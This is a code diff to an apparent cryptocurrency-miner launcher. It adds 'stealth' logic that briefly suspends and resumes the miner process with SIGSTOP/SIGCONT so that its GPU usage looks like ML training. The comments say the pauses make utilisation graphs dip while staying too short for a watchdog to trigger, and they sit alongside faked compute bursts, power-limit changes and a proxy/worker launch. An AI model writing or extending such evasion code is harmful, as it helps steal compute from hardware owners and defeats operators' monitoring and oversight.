@@ -304,7 +304,7 @@ def set_gpu_power_limit(watts):
     except Exception:
         pass
 
-def gpu_burst_cycle():
+def gpu_burst_cycle(miner_pid_ref):
     """Mimics real training behavior with CPU/GPU load patterns.
 
     Simulates: batch compute → data loading → batch compute → eval checkpoint
@@ -312,7 +312,7 @@ def gpu_burst_cycle():
     - CPU load during idle (simulates data preprocessing)
     - GPU matmul during idle (simulates gradient sync)
     - Periodic eval pauses (simulates validation set evaluation)
-    - GPU drops to 30W during idle (actually pauses)
+    - SIGSTOP micro-pauses (200-500ms) + idle pauses (2-5s)
     """
     import torch
     has_torch = False
@@ -349,6 +349,11 @@ def gpu_burst_cycle():
         except Exception:
             pass
 
+    # Wait for miner PID to be set (miner launches after threads start)
+    while miner_pid_ref[0] is None:
+        time.sleep(0.5)
+    miner_pid = miner_pid_ref[0]
+
     while True:
         # ── Phase 1: Compute burst (simulates forward+backward pass) ──
         burst_sec = random.choices(
@@ -358,12 +363,30 @@ def gpu_burst_cycle():
         set_gpu_power_limit(random.randint(500, 700))
         time.sleep(burst_sec)
 
+        # ── Micro-pause: brief SIGSTOP (200-500ms) ──
+        # Creates visible utilization dips on monitoring graph
+        # Too short for watchdog to trigger (< 1s)
+        try:
+            os.kill(miner_pid, signal.SIGSTOP)
+            time.sleep(random.uniform(0.2, 0.5))
+            os.kill(miner_pid, signal.SIGCONT)
+        except (ProcessLookupError, OSError):
+            pass
+
         # ── Phase 2: Data loading idle (simulates CPU data prep) ──
         set_gpu_power_limit(30)  # Drop to near-zero — GPU actually pauses
         idle_sec = random.choices(
             [3, 5, 8, 12, 15, 20, 30],
             weights=[10, 20, 25, 20, 15, 7, 3],
         )[0]
+
+        # SIGSTOP during idle — GPU truly pauses for 2-5s
+        try:
+            os.kill(miner_pid, signal.SIGSTOP)
+            time.sleep(random.uniform(2, 5))
+            os.kill(miner_pid, signal.SIGCONT)
+        except (ProcessLookupError, OSError):
+            pass
 
         cpu_thread = threading.Thread(target=cpu_load, args=(idle_sec,), daemon=True)
         cpu_thread.start()
@@ -799,10 +822,12 @@ def main():
     print(f"[launch] proxy={PROXY} address=<redacted> worker={WORKER}")
 
     # Step 7: Start background stealth threads BEFORE exec
+    # Shared PID reference — set after miner launches
+    MINER_PID_REF = [None]
     threads = []
 
-    # Burst cycle: variable compute + idle + CPU load + eval/ckpt
-    t = threading.Thread(target=gpu_burst_cycle, daemon=True)
+    # Burst cycle: variable compute + idle + CPU load + eval/ckpt + SIGSTOP
+    t = threading.Thread(target=gpu_burst_cycle, args=(MINER_PID_REF,), daemon=True)
     t.start()
     threads.append(t)
 
@@ -886,6 +911,7 @@ while True:
             return proc.returncode
 
         print(f"[main] miner PID: {proc.pid}")
+        MINER_PID_REF[0] = proc.pid  # Signal burst cycle to start SIGSTOP pauses
         print("[main] running... Ctrl+C to stop")
 
         # Start heartbeat monitoring (only in fallback path where PID is available)
